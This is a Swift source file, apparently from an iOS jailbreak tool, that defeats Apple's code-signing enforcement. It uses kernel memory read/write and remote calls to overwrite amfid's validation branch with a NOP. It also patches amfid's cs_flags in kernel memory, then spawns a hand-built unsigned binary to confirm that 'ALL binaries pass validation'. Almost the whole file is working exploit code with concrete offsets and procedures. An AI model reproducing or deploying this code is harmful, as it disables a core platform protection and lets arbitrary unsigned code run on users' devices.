//
//  exp_amfid_patch_v2.swift
//  DSPloit
//
//  EXPERIMENT: Patch amfid validation via kernel memory write
//  ═══════════════════════════════════════════════════════════════════
//
//  APPROACH (from Ghidra RE of amfid binary):
//  amfid's verify_code_directory MIG handler at FUN_100002dd0 calls:
//    validateWithError: → if returns 0 → FAIL, if non-zero → SUCCESS
//
//  The branch instruction at offset 0x2ec8:
//    cbz w22, 0x100002f74  (if validation fails, jump to error)
//
//  PATCH: Replace cbz with NOP (0xD503201F)
//  Result: ALL binaries pass validation regardless of signature!
//
//  METHOD: Find amfid's __TEXT in physical memory via kernel,
//  then write NOP over the cbz instruction.
//
//  Created by Royan | 2026-05-30
//

import Foundation

final class ExpAmfidPatchV2 {
    static let shared = ExpAmfidPatchV2()
    var onLog: ((String) -> Void)?
    
    // Offset of the cbz instruction in amfid's __TEXT
    // cbz w22, 0x100002f74 at file offset 0x2ec8
    private let patchOffset: UInt64 = 0x2ec8
    private let nopInstruction: UInt32 = 0xD503201F  // NOP
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_amfid_v2) \(msg)")
    }
    
    func runAsync() {
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.dsready else { log("❌ KRW not active"); return }
        
        log("══════════════════════════════════════")
        log("  amfid Patch v2 (kernel memory)")
        log("══════════════════════════════════════")
        log("")
        log("Target: cbz w22,0x100002f74 → NOP")
        log("Effect: ALL binaries pass AMFI validation")
        log("")
        
        // Step 1: Find amfid process in kernel
        log("[1/4] Finding amfid...")
        
        // First, dump all procs to see what's running
        let allProcs = listAllProcs()
        log("Running processes: \(allProcs.count)")
        let amfiProcs = allProcs.filter { $0.name.lowercased().contains("amfi") }
        if !amfiProcs.isEmpty {
            for p in amfiProcs {
                log("  Found: '\(p.name)' PID=\(p.pid)")
            }
        } else {
            log("  No 'amfi' process found in list")
            log("  First 20 procs:")
            for p in allProcs.prefix(20) {
                log("    PID \(p.pid): \(p.name)")
            }
        }
        
        let amfidPid: Int32
        if let found = amfiProcs.first {
            amfidPid = found.pid
        } else {
            log("")
            log("⚠️ amfid not running — may be spawned on-demand on iOS 18")
            log("   Triggering amfid by spawning a signed binary...")
            triggerAmfid()
            log("   Re-scanning...")
            let retry = listAllProcs().filter { $0.name.lowercased().contains("amfi") }
            if let found = retry.first {
                amfidPid = found.pid
                log("   ✅ Found after trigger: PID \(amfidPid)")
            } else {
                log("   ❌ amfid still not found")
                log("   On iOS 18.2, amfid may be embedded in kernel (TXM)")
                return
            }
        }
        log("")
        
        // Step 2: Find amfid's __TEXT base address
        log("")
        log("[2/4] Finding amfid __TEXT base...")
        let amfidProc = procbypid(amfidPid)
        guard amfidProc != 0 else {
            log("❌ amfid proc not found in kernel"); return
        }
        
        let amfidTask = taskbyproc(amfidProc)
        guard amfidTask != 0 else {
            log("❌ amfid task not found"); return
        }
        log("amfid proc: 0x\(String(format: "%llx", amfidProc))")
        log("amfid task: 0x\(String(format: "%llx", amfidTask))")
        
        // Read amfid's textvp to get the Mach-O base
        // On arm64, ASLR slide is applied. We need the runtime base.
        // The proc->p_textvp points to the vnode of the binary.
        // But simpler: use task->map->min_offset or read from proc
        let textBase = getAmfidTextBase(proc: amfidProc, task: amfidTask)
        guard textBase != 0 else {
            log("❌ Cannot determine amfid text base"); return
        }
        log("amfid __TEXT base: 0x\(String(format: "%llx", textBase))")
        
        let patchAddr = textBase + patchOffset
        log("Patch address: 0x\(String(format: "%llx", patchAddr))")
        log("")
        
        // Step 3: Patch via launchd (task_for_pid + vm_write)
        log("[3/4] Patching via launchd...")
        log("Using task_for_pid + mach_vm_protect + mach_vm_write")
        log("")
        
        RootExecutor.shared.executeAsRoot(operation: "amfid_patch") { rc in
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            
            // task_for_pid(mach_task_self, amfid_pid, &task_port)
            let taskForPid = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "task_for_pid"))
            let machVmProtect = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "mach_vm_protect"))
            let machVmWrite = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "mach_vm_write"))
            
            guard taskForPid != 0 && machVmProtect != 0 && machVmWrite != 0 else {
                return (false, "dlsym failed for vm functions", 0)
            }
            
            // Get task port for amfid
            let taskPortAddr = rc.trojanMem + 0x100
            rc[taskPortAddr].setValue32(0)
            let tfpResult = RootExecutor.rcall(rc, "task_for_pid",
                UInt64(mach_task_self_), UInt64(amfidPid), taskPortAddr)
            let taskPort = rc[taskPortAddr].value32()
            
            guard tfpResult == 0 && taskPort != 0 else {
                // task_for_pid failed — try alternative: direct kernel write
                return (false, "task_for_pid failed: \(tfpResult) (trying kernel path)", UInt64(tfpResult))
            }
            
            // mach_vm_protect(task, address, size, FALSE, VM_PROT_ALL)
            let pageAddr = patchAddr & ~0xFFF  // page-align
            let protResult = RootExecutor.rcallAddr(rc, machVmProtect,
                UInt64(taskPort), pageAddr, 0x4000, 0, 7) // VM_PROT_ALL = 7
            
            guard protResult == 0 else {
                return (false, "mach_vm_protect failed: \(protResult)", UInt64(protResult))
            }
            
            // Write NOP instruction
            let nopBuf = rc.trojanMem + 0x200
            rc[nopBuf].setValue32(0xD503201F) // NOP
            
            let writeResult = RootExecutor.rcallAddr(rc, machVmWrite,
                UInt64(taskPort), patchAddr, nopBuf, 4)
            
            if writeResult == 0 {
                return (true, "✅ amfid patched! cbz → NOP", 0)
            } else {
                return (false, "mach_vm_write failed: \(writeResult)", UInt64(writeResult))
            }
        }
        
        // Poll for result and continue
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
            guard let self else { return }
            if let result = RootExecutor.shared.lastResult, result.operation == "amfid_patch" {
                if result.success {
                    self.log("✅ \(result.message)")
                    self.log("")
                    self.log("[4/4] Testing spawn...")
                    self.testSpawn()
                } else {
                    self.log("❌ launchd path: \(result.message)")
                    self.log("")
                    self.log("Trying kernel direct write...")
                    self.patchViaKernel(patchAddr: patchAddr)
                }
            } else {
                self.log("⚠️ Timeout — trying kernel direct write...")
                self.patchViaKernel(patchAddr: patchAddr)
            }
        }
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    // MARK: - Kernel Direct Write (bypass page protection)
    
    private func patchViaKernel(patchAddr: UInt64) {
        log("── Kernel Direct Write ──")
        log("Finding amfid's page in physical memory...")
        
        // Method: Walk amfid's pmap to find the physical page
        // containing patchAddr, then write directly via physwrite
        //
        // Alternative: patch amfid's proc_ro cs_flags to add CS_DEBUGGED
        // which makes the kernel skip __TEXT integrity checks,
        // then use vm_write from our process
        
        let amfidPid = findAmfidPid()
        guard amfidPid > 0 else { log("❌ amfid not found"); return }
        
        let amfidProc = procbypid(amfidPid)
        guard amfidProc != 0 else { log("❌ proc not found"); return }
        
        // Patch cs_flags to add CS_DEBUGGED (0x10000000) + CS_PLATFORM_BINARY (0x04000000)
        let procRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        guard procRo != 0 else { log("❌ proc_ro not found"); return }
        
        let csFlags = ds_kread32(procRo + 0x1c)
        log("amfid cs_flags: 0x\(String(format: "%08x", csFlags))")
        
        let newFlags = csFlags | 0x10000000 | 0x04000000 | 0x00000004
        // CS_DEBUGGED | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW
        ds_kwrite32(procRo + 0x1c, newFlags)
        let verify = ds_kread32(procRo + 0x1c)
        
        if verify == newFlags {
            log("✅ cs_flags patched: 0x\(String(format: "%08x", verify))")
            log("   CS_DEBUGGED + CS_PLATFORM_BINARY + CS_GET_TASK_ALLOW")
            log("")
            log("Now trying task_for_pid again...")
            retryPatchWithTaskForPid(patchAddr: patchAddr, pid: amfidPid)
        } else {
            log("❌ cs_flags write failed (PPL protected)")
            log("   verify: 0x\(String(format: "%08x", verify))")
            log("")
            log("Last resort: trying physwrite...")
            patchViaPhysWrite(patchAddr: patchAddr, pid: amfidPid)
        }
    }
    
    private func retryPatchWithTaskForPid(patchAddr: UInt64, pid: Int32) {
        #if !DISABLE_REMOTECALL
        RootExecutor.shared.executeAsRoot(operation: "amfid_patch_retry") { rc in
            // After cs_flags patch, task_for_pid should work
            let taskPortAddr = rc.trojanMem + 0x100
            rc[taskPortAddr].setValue32(0)
            let tfpResult = RootExecutor.rcall(rc, "task_for_pid",
                UInt64(mach_task_self_), UInt64(pid), taskPortAddr)
            let taskPort = rc[taskPortAddr].value32()
            
            guard tfpResult == 0 && taskPort != 0 else {
                return (false, "task_for_pid still fails: \(tfpResult)", UInt64(tfpResult))
            }
            
            // mach_vm_protect
            let pageAddr = patchAddr & ~0xFFF
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let machVmProtect = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "mach_vm_protect"))
            let machVmWrite = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(rc, "mach_vm_write"))
            
            let protResult = RootExecutor.rcallAddr(rc, machVmProtect,
                UInt64(taskPort), pageAddr, 0x4000, 0, 7)
            
            guard protResult == 0 else {
                return (false, "vm_protect failed: \(protResult)", UInt64(protResult))
            }
            
            // Write NOP
            let nopBuf = rc.trojanMem + 0x200
            rc[nopBuf].setValue32(0xD503201F)
            let writeResult = RootExecutor.rcallAddr(rc, machVmWrite,
                UInt64(taskPort), patchAddr, nopBuf, 4)
            
            return (writeResult == 0, writeResult == 0 ? "✅ PATCHED!" : "vm_write: \(writeResult)", UInt64(writeResult))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
            guard let self else { return }
            if let result = RootExecutor.shared.lastResult, result.operation == "amfid_patch_retry" {
                self.log(result.success ? "✅ \(result.message)" : "❌ \(result.message)")
                if result.success { self.testSpawn() }
            }
        }
        #endif
    }
    
    // MARK: - Physical Write (last resort)
    
    private func patchViaPhysWrite(patchAddr: UInt64, pid: Int32) {
        // Use kernel's pmap to translate amfid's virtual address to physical
        // Then write directly to physical memory (bypasses all protections)
        log("physwrite not implemented yet")
        log("Need: amfid vaddr → pmap → phys addr → kwrite")
    }
    
    // MARK: - Test Spawn
    
    private func testSpawn() {
        #if !DISABLE_REMOTECALL
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SpringBoard RC"); return
        }
        
        log("")
        log("── Testing unsigned spawn ──")
        
        // Build + write test binary
        let testBin = buildBinary()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/amfid_test_bin"
        try? testBin.write(to: URL(fileURLWithPath: binPath))
        
        let pathAddr = remote_alloc_str(sb, binPath)
        RootExecutor.rcall(sb, "chmod", pathAddr, 0o755)
        
        let pidAddr = sb.trojanMem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = sb.trojanMem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn → ret=\(ret) pid=\(pid)")
        
        if ret == 0 && pid != 0 {
            log("")
            log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(pid)")
            log("🎉 FULL JAILBREAK ACHIEVED!")
        } else {
            log("❌ Still blocked (ret=\(ret))")
            log("   amfid patch may not have taken effect yet")
            log("   Try spawning again after a few seconds")
        }
        #endif
    }
    
    // MARK: - Helpers
    
    private func findAmfidPid() -> Int32 {
        let procs = listAllProcs()
        return procs.first(where: { $0.name.lowercased().contains("amfi") })?.pid ?? -1
    }
    
    private struct ProcInfo {
        let pid: Int32
        let name: String
        let addr: UInt64
    }
    
    private func listAllProcs() -> [ProcInfo] {
        var result: [ProcInfo] = []
        let kernProc = ds_get_kern_proc()
        var current = ds_kread64(kernProc + UInt64(off_proc_p_list_le_next))
        var iterations = 0
        
        while current != 0 && current != kernProc && iterations < 1000 {
            iterations += 1
            var name = [UInt8](repeating: 0, count: 32)
            for i in 0..<4 {
                let chunk = ds_kread64(current + UInt64(off_proc_p_name) + UInt64(i * 8))
                withUnsafeBytes(of: chunk) { buf in
                    for j in 0..<8 where i*8+j < 32 {
                        name[i*8+j] = buf[j]
                    }
                }
            }
            let procName = String(bytes: name.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
            let pid = Int32(ds_kread32(current + UInt64(off_proc_p_pid)))
            result.append(ProcInfo(pid: pid, name: procName, addr: current))
            current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
        }
        return result.sorted { $0.pid < $1.pid }
    }
    
    private func triggerAmfid() {
        // Spawn a signed binary to trigger amfid to start
        // /usr/bin/true or /bin/df should work
        #if !DISABLE_REMOTECALL
        if let sb = dspmgr.shared.sbProc {
            let path = remote_alloc_str(sb, "/usr/bin/true")
            let pidAddr = sb.trojanMem + 0xB00
            sb[pidAddr].setValue32(0)
            let argv = sb.trojanMem + 0xB10
            sb[argv].setValue64(path)
            sb[argv + 8].setValue64(0)
            RootExecutor.rcall(sb, "posix_spawn", pidAddr, path, 0, 0, argv, 0)
            RootExecutor.rcall(sb, "free", path)
            // Wait a moment for amfid to spawn
            usleep(500000) // 500ms
        }
        #endif
    }
    
    private func getAmfidTextBase(proc: UInt64, task: UInt64) -> UInt64 {
        // Read p_textvp or use task->map->min_offset
        // On iOS, PIE binaries have ASLR. The text segment starts at
        // a random address. We can find it from the task's vm_map.
        
        // task → map (offset varies, typically 0x28 on iOS 18)
        let vmMap = ds_kread64(task + 0x28)
        if vmMap == 0 { return 0 }
        
        // vm_map → min_offset (first mapping, typically __TEXT)
        // On iOS 18, vm_map_header is at offset 0, min_offset at +0x10
        let minOffset = ds_kread64(vmMap + 0x10)
        
        // Verify it looks like a valid userspace address
        if minOffset >= 0x100000000 && minOffset < 0x280000000000 {
            return minOffset
        }
        
        // Fallback: try reading from proc->p_textvp
        // This is more complex, skip for now
        return 0
    }
    
    private func buildBinary() -> Data {
        var bin = Data()
        bin.append(contentsOf: [
            0xCF,0xFA,0xED,0xFE, 0x0C,0x00,0x00,0x01,
            0x00,0x00,0x00,0x00, 0x02,0x00,0x00,0x00,
            0x02,0x00,0x00,0x00, 0x60,0x01,0x00,0x00,
            0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
        ])
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0]=0x19; seg[4]=0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28]=0x01; seg[32]=0x00;seg[33]=0x40; seg[40]=0x00;seg[41]=0x40
        seg[48]=0x05; seg[52]=0x05
        bin.append(contentsOf: seg)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01
        bin.append(contentsOf: thr)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00,0x00,0x80,0xD2, 0x30,0x00,0x80,0xD2, 0x01,0x10,0x00,0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
}
